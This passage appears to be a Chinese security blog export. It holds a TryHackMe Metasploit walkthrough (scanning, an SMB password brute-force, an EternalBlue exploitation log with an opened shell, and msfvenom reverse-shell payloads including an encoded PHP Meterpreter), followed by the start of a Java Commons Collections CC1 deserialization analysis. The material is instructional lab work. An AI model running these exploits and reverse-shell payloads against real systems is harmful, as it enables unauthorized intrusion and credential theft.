target host(s), see https://docs.metasploit.com/docs/us ing-metasploit/basics/using-metasploit.html RPORT 137 yes The target port (UDP) THREADS 10 yes The number of concurrent threads View the full module info with the info, or info -d command. msf6 auxiliary(scanner/netbios/nbname) &gt; set rhosts 10.10.173.123 rhosts =&gt; 10.10.173.123 msf6 auxiliary(scanner/netbios/nbname) &gt; run [*] Sending NetBIOS requests to 10.10.173.123-&gt;10.10.173.123 (1 hosts) [+] 10.10.173.123 [IP-10-10-173-12] OS:Unix Names:(ACME IT SUPPORT, IP-10-10-173-12) Addresses:(10.10.173.123) Mac:00:00:00:00:00:00 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed 8000端口上正在运行什么？ msf6 auxiliary(scanner/http/http_version) &gt; info Name: HTTP Version Detection Module: auxiliary/scanner/http/http_version License: Metasploit Framework License (BSD) Rank: Normal Provided by: hdm &lt;x@hdm.io&gt; Check supported: No Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.173.123 yes The target host(s), see https://docs.metasploit.com/docs/using -metasploit/basics/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections THREADS 1 yes The number of concurrent threads (max one per host) VHOST no HTTP server virtual host Description: Display version information about each system. View the full module info with the info -d command. msf6 auxiliary(scanner/http/http_version) &gt; set rport 8000 rport =&gt; 8000 msf6 auxiliary(scanner/http/http_version) &gt; set threads 15 threads =&gt; 15 msf6 auxiliary(scanner/http/http_version) &gt; run [+] 10.10.173.123:8000 webfs/1.21 ( 403-Forbidden ) [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed “penny”用户的 SMB 密码是什么？使用上一个任务中提到的单词表。 msf6 auxiliary(scanner/smb/smb_login) &gt; set rhosts 10.10.173.123 rhosts =&gt; 10.10.173.123 msf6 auxiliary(scanner/smb/smb_login) &gt; set pass_file /usr/share/wordlists/metasploit/MetasploitWordlist.txt pass_file =&gt; /usr/share/wordlists/metasploit/MetasploitWordlist.txt msf6 auxiliary(scanner/smb/smb_login) &gt; set threads 15 threads =&gt; 15 msf6 auxiliary(scanner/smb/smb_login) &gt; set SMBUser SMBUser =&gt; msf6 auxiliary(scanner/smb/smb_login) &gt; set SMBUser penny SMBUser =&gt; penny msf6 auxiliary(scanner/smb/smb_login) &gt; run 0x03 Metasploit 数据库 虽然在 TryHackMe 上与单个目标交互时不需要这样做，但实际的渗透测试活动可能会有多个目标。 Metasploit 具有数据库功能，可以简化项目管理并避免设置参数值时可能出现的混乱。 您首先需要启动 PostgreSQL 数据库，Metasploit 将通过以下命令使用该数据库： systemctl start postgresql 然后您需要使用 msfdb init 命令初始化 Metasploit 数据库。 ┌──(root㉿kali)-[/home/hybcx] └─# systemctl start postgresql.service ┌──(root㉿kali)-[/home/hybcx] └─# msfdb init [i] Database already started [+] Creating database user 'msf' 为新角色输入的口令: 再输入一遍: [+] Creating databases 'msf' [+] Creating databases 'msf_test' [+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml' [+] Creating initial database schema 您现在可以启动msfconsole 并使用以下命令检查数据库状态db_status command. 命令。 msf6 &gt; db_status [*] Connected to msf. Connection type: postgresql. msf6 &gt; 数据库功能将允许您创建工作区来隔离不同的项目。首次启动时，您应该位于默认工作区中。您可以使用命令列出可用的工作区 msf6 &gt; workspace * default msf6 &gt; 您可以使用以下命令添加工作区-a 参数或使用删除工作区-d参数，分别。下面的屏幕截图显示创建了一个为“tryhackme”的新工作区。 您还会注意到新的数据库名称以红色打印，以* symbol. 象征。 您可以使用工作区命令在工作区之间导航，只需键入workspace 后跟所需的工作区名称。 您可以使用workspace -h 命令列出可用选项workspace command. 命令。 与常规 Metasploit 使用不同，一旦使用数据库启动 Metasploit，help 命令，您将显示数据库后端命令菜单。 如果您使用以下命令运行 Nmap 扫描db_nmap 如下所示，所有结果将保存到数据库中。 db_nmap -sV -p- 10.10.173.123 您现在可以使用以下命令获取与目标系统上运行的主机和服务相关的信息hosts and 和services 命令。 命令可以帮助您更加熟悉可用的选项。 一旦主机信息存储在数据库中，您就可以使用 hosts -R命令将此值添加到 RHOSTS 参数。 示例工作流程 我们将使用漏洞扫描模块，通过 use auxiliary/scanner/smb/smb_ms17_010 命令查找潜在的 MS17-010 漏洞。 我们使用 hosts -R 设置 ROSTS 值. 我们输入 show options 来检查所有值是否都已正确分配。 （在本例中，10.10.138.32是我们之前使用 db_nmap 命令扫描到的IP地址） 设置完所有参数后，我们使用 run 或 exploit 命令启动漏洞利用。 如果数据库中保存了多于一台主机，则在配置时将使用所有 IP 地址。hosts -R 命令。 在典型的渗透测试中，我们可能会遇到以下场景： 使用 db_nmap 命令查找可用主机 扫描这些是否有更多漏洞或开放端口（使用端口扫描模块） 与 -S 参数一起使用的 services 命令将允许您搜索环境中的特定服务。 msf6 &gt; services -S netbios Services ======== host port proto name state info ---- ---- ----- ---- ----- ---- 10.10.12.229 139 tcp netbios-ssn open Microsoft Windows netbios-ssn 您可能想要寻找容易实现的目标，例如： HTTP：可能会托管一个 Web 应用程序，您可以在其中找到 SQL 注入或远程代码执行 (RCE) 等漏洞。 FTP：可以允许匿名登录并提供对有趣文件的访问。 SMB：可能容易受到 MS17-010 等 SMB 漏洞的攻击 SSH：可能有默认或容易猜测的凭据 RDP：如果使用弱凭据，可能容易受到 Bluekeep 的攻击或允许桌面访问。 正如您所看到的，Metasploit 具有许多有助于参与的功能，例如能够将您的参与划分到工作区、高级分析结果以及快速导入和探索数据。 0x04 漏洞扫描 Metasploit 允许您快速识别一些可被视为“容易实现的目标”的关键漏洞。术语“唾手可得的果实”通常指的是易于识别和利用的漏洞，这些漏洞可能会让您在系统上获得立足点，并在某些情况下获得高级权限，例如 root 或管理员权限。 使用 Metasploit 查找漏洞在很大程度上取决于您对目标进行扫描和指纹识别的能力。您在这些阶段做得越好，Metasploit 可以为您提供的选择就越多。例如，如果您识别出目标上运行的 VNC 服务，您可以使用 Metasploit 上的 search 功能来列出有用的模块。结果将包含有效负载和帖子模块。在现阶段，这些结果并不是很有用，因为我们还没有发现可以使用的潜在漏洞。但是，对于 VNC，我们可以使用多个扫描仪模块。 msf6 &gt; use auxiliary/scanner/vnc/ use auxiliary/scanner/vnc/ard_root_pw use auxiliary/scanner/vnc/vnc_login use auxiliary/scanner/vnc/vnc_none_auth msf6 &gt; use auxiliary/scanner/vnc/ 您可以对任何模块使用 info 命令，以更好地了解其用途和用途。 msf6 auxiliary(scanner/vnc/vnc_login) &gt; info Name: VNC Authentication Scanner Module: auxiliary/scanner/vnc/vnc_login License: Metasploit Framework License (BSD) Rank: Normal Provided by: carstein jduck Check supported: No Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list PASSWORD no The password to test PASS_FILE /opt/metasploit-framework-5101/data/wordlists/vnc_passwords.txt no File containing passwords, one per line Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 5900 yes The target port (TCP) STOP_ON_SUCCESS false yes Stop guessing when a credential works for a host THREADS 1 yes The number of concurrent threads (max one per host) USERNAME no A specific username to authenticate as USERPASS_FILE no File containing users and passwords separated by space, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE no File containing usernames, one per line VERBOSE true yes Whether to print output for all attempts Description: This module will test a VNC server on a range of machines and report successful logins. Currently it supports RFB protocol version 3.3, 3.7, 3.8 and 4.001 using the VNC challenge response authentication method. References: https://cvedetails.com/cve/CVE-1999-0506/ msf6 auxiliary(scanner/vnc/vnc_login) &gt; 正如您所看到的， vnc_login 模块可以帮助我们找到VNC服务的登录详细信息。 谁编写了允许我们检查 SMTP 服务器的开放中继的模块？ 0x05 利用/开发 顾名思义，Metasploit 是一个开发框架。漏洞利用是最常见的模块类别。 =[ metasploit v5.0.101-dev] + -- --=[ 2048 exploits - 1105 auxiliary - 344 post] + -- --=[ 562 payloads - 45 encoders - 10 nops] + -- --=[ 7 evasion] 您可以使用 search 命令搜索漏洞利用程序，使用 info 命令获取有关漏洞利用程序的更多信息，并使用 exploit 启动漏洞利用程序。虽然过程本身很简单，但请记住，成功的结果取决于对目标系统上运行的服务的透彻理解。 大多数漏洞利用都会有预设的默认负载。但是，您始终可以使用 show payloads 命令列出可用于该特定漏洞的其他命令。 一旦您决定了有效负载，您可以使用 set payload 命令进行选择。 msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 2 payload =&gt; generic/shell_reverse_tcp msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Payload options (generic/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 请注意，由于环境或操作系统限制（例如防火墙规则、防病毒、文件写入）或执行有效负载的程序不可用（例如，payload/python/shell_reverse_tcp），选择工作有效负载可能会成为一个反复试验的过程）。 某些有效负载将打开您可能需要设置的新参数，再次运行 show options 命令可以显示这些参数。正如您在上面的示例中所看到的，反向负载至少需要您设置 LHOST 选项。 msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 10.10.186.44 lhost =&gt; 10.10.186.44 msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit [*] Started reverse TCP handler on 10.10.186.44:4444 [*] 10.10.12.229:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.12.229:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.12.229:445 - Scanned 1 of 1 hosts (100% complete) [*] 10.10.12.229:445 - Connecting to target for exploitation. [+] 10.10.12.229:445 - Connection established for exploitation. [+] 10.10.12.229:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.12.229:445 - CORE raw buffer dump (42 bytes) [*] 10.10.12.229:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.12.229:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.12.229:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.12.229:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.12.229:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.12.229:445 - Sending all but last fragment of exploit packet [*] 10.10.12.229:445 - Starting non-paged pool grooming [+] 10.10.12.229:445 - Sending SMBv2 buffers [+] 10.10.12.229:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.12.229:445 - Sending final SMBv2 buffers. [*] 10.10.12.229:445 - Sending last fragment of exploit packet! [*] 10.10.12.229:445 - Receiving response from exploit packet [+] 10.10.12.229:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.12.229:445 - Sending egg to corrupted connection. [*] 10.10.12.229:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (10.10.186.44:4444 -&gt; 10.10.12.229:49366) at 2021-08-20 04:51:19 +0100 C:\\Windows\\system32&gt; 打开会话后，您可以使用 CTRL+Z 将其置于后台，或使用 CTRL+C 将其中止。当同时处理多个目标或使用不同的漏洞利用和/或 shell 处理同一目标时，后台会话将非常有用。 C:\\Windows\\system32&gt;^Z Background session 1? [y/N] y msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.10.186.44:4444 -&gt; 10.10.12.229:49366 (10.10.12.229) msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; 使用会话 sessions 命令将列出所有活动会话。 sessions 命令支持许多选项，可帮助您更好地管理会话。 您可以使用 sessions -i 命令后跟会话 ID 与任何现有会话进行交互。 msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.10.186.44:4444 -&gt; 10.10.12.229:49366 (10.10.12.229) msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; sessions -i 1 [*] Starting interaction with 1... C:\\Windows\\system32&gt; 部署目标机器并回答以下问题： 这里先用db_nmap扫描靶机 发现445端口，看了文章尝试利用永恒之蓝 最终也是成功拿到shell，这里却不知道用什么命令找flag.txt，看了wp发现使用search 利用hashdump下载目标hash，利用在线工具破解 0x06 Msfvenom Msfvenom 取代了 Msfpayload 和 Msfencode，允许您生成有效负载。 Msfvenom 将允许您访问 Metasploit 框架中可用的所有有效负载。 Msfvenom 允许您为许多不同的目标系统（Apple、Windows、Android、Linux 等）创建多种不同格式（PHP、exe、dll、elf 等）的有效负载。 输出格式 您可以生成独立的有效负载（例如 Meterpreter 的 Windows 可执行文件）或获取可用的原始格式（例如 python）。 msfvenom --list formats 命令可用于列出支持的输出格式 编码 与某些观点相反，编码器的目的并不是绕过目标系统上安装的防病毒软件。顾名思义，它们对有效负载进行编码。虽然它可以有效对抗某些防病毒软件，但使用现代混淆技术或学习方法注入 shellcode 是解决该问题的更好方法。下面的例子展示了编码的用法（带有 -e 参数。PHP 版本的 Meterpreter 采用 Base64 编码，输出格式为 raw 。 root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64 [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload [-] No arch selected, selecting arch: php from the payload Found 1 compatible encoders Attempting to encode payload with 1 iterations of php/base64 php/base64 succeeded with size 1507 (iteration=0) php/base64 chosen with final size 1507 Payload size: 1507 bytes eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE4Ni40NCc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7)); root@ip-10-10-186-44:~# 处理程序 与使用反向 shell 的漏洞类似，您需要能够接受 MSFvenom 有效负载生成的传入连接。当使用exploit模块时，这部分由exploit模块自动处理，你会记得设置反向shell时 payload options 标题是如何出现的。通常用于接收来自目标的连接的术语是“捕获 shell”。使用处理程序可以轻松捕获 MSFvenom 有效负载中生成的反向 shell 或 Meterpreter 回调。 以下场景可能很熟悉；我们将利用 DVWA（该死的易受攻击的 Web 应用程序）中存在的文件上传漏洞。对于本任务中的练习，您将需要在另一个目标系统上复制类似的场景，此处使用 DVWA 进行说明。漏洞利用步骤是： 使用 MSFvenom 生成 PHP shell 启动 Metasploit 处理程序 执行 PHP shell MSFvenom 将需要有效负载、本地计算机 IP 地址以及有效负载将连接的本地端口。如下所示，10.0.2.19是攻击中使用的AttackBox的IP地址，并且选择了本地端口7777。 root@ip-10-0-2-19:~# msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw &gt; reverse_shell.php [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload [-] No arch selected, selecting arch: php from the payload No encoder specified, outputting raw payload Payload size: 3020 bytes root@ip-10-0-2-19:~# 请注意：输出 PHP 文件将错过注释的起始 PHP 标记和结束标记 ( ?&gt; )，如下所示。 应编辑reverse_shell.php 文件以将其转换为可用的PHP 文件。 下面：从文件开头删除的注释。 下图：添加了结束标签 我们将使用 Multi Handler 来接收传入的连接。该模块可以与 use exploit/multi/handler 命令一起使用。 多处理程序支持所有 Metasploit 有效负载，并且可用于 Meterpreter 以及常规 shell。 要使用该模块，我们需要设置有效负载值（在本例中为 php/reverse_php ）、LHOST 和 LPORT 值。 msf6 &gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf5 exploit(multi/handler) &gt; set payload php/reverse_php payload =&gt; php/reverse_php msf5 exploit(multi/handler) &gt; set lhost 10.0.2.19 lhost =&gt; 10.0.2.19 msf6 exploit(multi/handler) &gt; set lport 7777 lport =&gt; 7777 msf6 exploit(multi/handler) &gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (php/reverse_php): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.0.2.19 yes The listen address (an interface may be specified) LPORT 7777 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target msf6 exploit(multi/handler) &gt; 一旦一切设置完毕，我们将 run 处理程序并等待传入连接。 msf6 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.186.44:7777 当反向shell被触发时，连接将被multi/handler接收并为我们提供一个shell。 如果有效负载设置为 Meterpreter（例如，以 Windows 可执行格式），则 multi/handler 将为我们提供 Meterpreter shell。 其他有效负载 根据目标系统的配置（操作系统、安装的网络服务器、安装的解释器等），msfvenom 可用于创建几乎所有格式的有效负载。以下是您经常使用的一些示例： 在所有这些示例中，LHOST 将是攻击计算机的 IP 地址，LPORT 将是处理程序侦听的端口。 Linux 可执行和可链接格式 (elf) msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf .elf 格式与 Windows 中的 .exe 格式相当。这些是 Linux 的可执行文件。但是，您可能仍然需要确保它们在目标计算机上具有可执行权限。例如，一旦目标计算机上有 shell.elf 文件，请使用 chmod +x shell.elf 命令授予可执行权限。完成后，您可以通过在目标计算机命令行上键入 ./shell.elf 来运行此文件。 Windows 视窗 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe &gt; rev_shell.exe PHP msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php ASP msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp &gt; rev_shell.asp Python msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.py 上面的所有示例都是反向负载。这意味着您需要让exploit/multi/handler模​​块在您的攻击机器上侦听才能作为处理程序工作。您需要使用有效负载、LHOST 和 LPORT 参数相应地设置处理程序。这些值将与您在创建 msfvenom 负载时使用的值相同。 攻击机生成elf恶意文件进行反弹shell，之后开启http服务器，进入靶机通过wget下载对应的shell文件 之后攻击机进入msfconsole选择监听payload，这里似乎只能选择linux/x86之类的，我用了一个php的监听脚本却不行 最终成功拿到shell，使用后利用模块转储系统上其他用户的哈希值。 0x07 总结 现在你应该更好地理解了 Metasploit 如何帮助你识别目标系统上的潜在漏洞并利用这些漏洞；你还能看到Metasploit的数据库特性如何帮助你开展针对多个潜在目标的渗透测试。 最后，你应该已经获得了一些关于msfvenom 和创建独立 Meterpreter 有效载荷的经验，在你可以将文件上传到目标系统或具有将文件下载到目标系统的能力的情况下，这尤其有帮助。 总之，Meterpreter 是一个强大的工具，在后期漏洞利用阶段提供了许多易于使用的特性。","tags":["Metasploit"],"categories":["Metasploit"]},{"title":"Java反序列化入门之CC1链分析","path":"/2024/03/18/java-fan-xu-lie-hua-zhi-cc1-lian/","content":"Apache CC1链分析 Commons Collections简介 Commons Collections是Apache软件基金会的一个开源项目，它提供了一组可复用的数据结构和算法 的实现，旨在扩展和增强Java集合框架，以便更好地满足不同类型应用的需求。该项目包含了多种不同 类型的集合类、迭代器、队列、堆栈、映射、列表、集等数据结构实现，以及许多实用程序类和算法实 现。它的代码质量较高，被广泛应用于Java应用程序开发中。 Commons Collections 3.1 版本的利用链衍生出多个版本的利用方式，但其核心部分是相同的，不同之 处在于中间过程的构造。Ysoserial 反序列化利用工具中提供了几种利用方式： 本文分析Commons Collections3.2.1版本下的一条最好用的反序列化漏洞链，这条攻击链被称为CC1 链。 此包的类包含下面两个，需要重点关注： Map Commons Collections在java.util.Map的基础上扩展了很多接口和类，比较有代表性的是 BidiMap、MultiMap和LazyMap。跟Bag和Buffer类似，Commons Collections也提供了一个 MapUtils。 所谓BidiMap，直译就是双向Map，可以通过key找到value，也可以通过value找到key，这在我们 日常的代码-名称匹配的时候很方便：因为我们除了需要通过代码找到名称之外，往往也需要处理 用户输入的名称，然后获取其代码。需要注意的是BidiMap当中不光key不能重复，value也不可 以。 所谓MultiMap，就是说一个key不再是简单的指向一个对象，而是一组对象，add()和remove()的 时候跟普通的Map无异，只是在get()时返回一个Collection，利用MultiMap，我们就可以很方便的 往一个key上放数量不定的对象，也就实现了一对多。 所谓LazyMap，意思就是这个Map中的键/值对一开始并不存在，当被调用到时才创建。 https://www.iteye.com/blog/duohuoteng-1630329 Transformer 我们有时候需要将某个对象转换成另一个对象供另一组方法调用，而这两类对象的类型有可能并不 是出于同一个继承体系的，或者说出了很基本的Object之外没有共同的父类，或者我们根本不关心 他们是不是有其他继承关系，甚至就是同一个类的实例只是对我们而言无所谓，我们为了它能够被 后续的调用者有意义的识别和处理，在这样的情形，我们就可以利用Transformer。除了基本的转 型Transformer之外，Commons Collections还提供了Transformer链和带条件的Transformer， 使得我们很方便的组装出有意义的转型逻辑。 https://blog.csdn.net/liliugen/article/details/83298363 环境搭建 由于存在漏洞的版本 commons-collections3.1-3.2.1 jdk 8u71之后已修复不可用，这里下载JDK-8u65：https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html 下载安装之后，配置到idea中，添加常规Maven项目，选择我们刚下载的jdk 然后配置Maven依赖下载CommonsCollections3.2.1版本。复制到pom.xml中即可 &lt;dependencies&gt; &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 由于我们分析时要涉及的jdk源码，所以要把jdk的源码也下载下来方便我们分析。 因为jdk自带的包里面有些文件是反编译的.class文件，我们没法清楚的看懂代码，为了方便我们调试，我们需要将他们转变为.java的文件，这就需要我们安装相应的源码:https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4 点击左下角的zip即可下载，然后解压。再进入到相应JDK的文件夹中，里面本来就有个src.zip的压缩 包，将其解压，然后把刚刚下载的源码包(jdk-af660750b2f4.zip)中/src/share/classes下的sun文件夹拷 贝到src文件夹中去。 打开IDEA，选择文件 —&gt;项目结构 —&gt;SDK —&gt;源路径 —&gt;把src文件夹添加到源路径下，保存即可。 但我做了如上配置发现没有sun目录的显示，又看了几篇文章发现，似乎是将src目录添加到类路径中 如下图不再显示.class则表示配置成功 反序列化分析 我们利用反序列化漏洞的方法一般是寻找到某个带有危险方法的类，然后溯源，看看哪个类中的方法有调用危险方法(有点像套娃，这个类中的某个方法调用了下个类中的某个方法，一步步套下去)，并且继承了序列化接口，然后再依次向上回溯，直到找到一个重写了readObject方法的类， 并且符合条件，那么这个就是起始类，我们可以利用这个类一步步的调用到危险方法(这里 以\"Runtime中的exec方法为例\")，这就是大致的Java漏洞链流程。 与PHP反序列化思路相似 源头 CC1链的源头就是Commons Collections库中的Tranformer接口，这个接口里面有个transform方法（这里我是点击了右上角的下载源代码才成了java文件，否则仍为class文件） 这里想补充一下：看了视频发现往上回溯的思路一般都是找不同类的相同方法，如果你找到的是相同类的相同方法是没意义的。 比如想找setValue方法，结果看到一个setValue调用setValue方法，那这不还是要找setValue方法被谁调用吗，如果找到的是a调用setValue方法，还能继续找谁调用了a，这样才有找头，遇到危险类的危险方法概率也就大。 然后就是寻找继承了这个接口的类 : ctrl+alt+b（前提是选中transform方法） 可以看到有很多类，我们这里找到了有重写transform方法的InvokerTransformer类（以上展示的都有重写transform的情况，但invoke这个类更符合预期），并且可以看到它也继承了Serializable，很符合我们的要求。 对于零基础的我，这里理解了一下为何这个类继承了我们的transform接口，原因在于上图的implements关键字： 用于表示一个类实现了一个或多个接口。当一个类使用implements关键字后面跟个多个接口名称的时候，他就表明该类承诺实现了这些接口中所定义的方法，来一个简单eg： public interface MyInterface { void myMethod(); } public class MyClass implements MyInterface { @Override public void myMethod() { // 实现接口中定义的方法 System.out.println(\"MyClass implements MyInterface\"); } } 上述例子可以看到定义了一个MyInterface类接口，里面定义了一个抽象方法myMethod方法。接着MyClass继承了MyInterface类，并在其中实现了接口中的myMethod方法。 InvokerTransformer.transform 定位到InvokerTransformer的transform方法 public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass();//获取input对象的class类对象 Method method = cls.getMethod(iMethodName, iParamTypes);//获取iMethodName方法 return method.invoke(input, iArgs);//调用iMethodName方法，传入iArgs参数，返回结果 } catch (NoSuchMethodException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' does not exist\"); } catch (IllegalAccessException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' cannot be accessed\"); } catch (InvocationTargetException ex) { throw new FunctorException(\"InvokerTransformer: The method '\" + iMethodName + \"' on '\" + input.getClass() + \"' threw an exception\", ex); } }//上面就是异常对应的处理了 可以看到上述try代码块就是调用了我们熟悉的反射机制，来返回某个方法的值，这是很明显的利用点：transform方法接受一个对象，不为空时，就会进行通过反射机制动态地调用对象的特定方法。 并且iMethodName 、 iParamTypes 、 iArgs 这几个参数都是通过构造函数控制的，并且为public： //有参构造函数。参数为方法名，调用方法的参数类型，调用方法的参数值 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; } 因为这些参数我们都可以控制，也就是说我们可以通过InvokerTransformer.transform()方法来调用任意类的任意方法，比如弹一个计算器： 可以看到成功执行了命令，说明我们成功找到了源头利用点了，接下来就是一步步回溯，寻找合适的类，构造利用链，直到到达重写了readObject的类（没有的话就不行了） 寻找某个类中的某个方法是否调用了transform方法，直接对这个方法右键查找用法（alt+F7），可以看到有很多类都调用了该方法 TransformedMap.checkSetValue 我们直接来到TransformedMap类下的checkSetValue方法 我们同样来看一下 TransformedMap 这个类的构造方法和 checkSetValue 方法 protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) { //接受三个参数，第一个为Map，我们可以传入hashmap。第二个和第三个为Transformer我们需要的了，且可控 super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer; } ....... protected Object checkSetValue(Object value) {//接受一个对象类型的参数 return 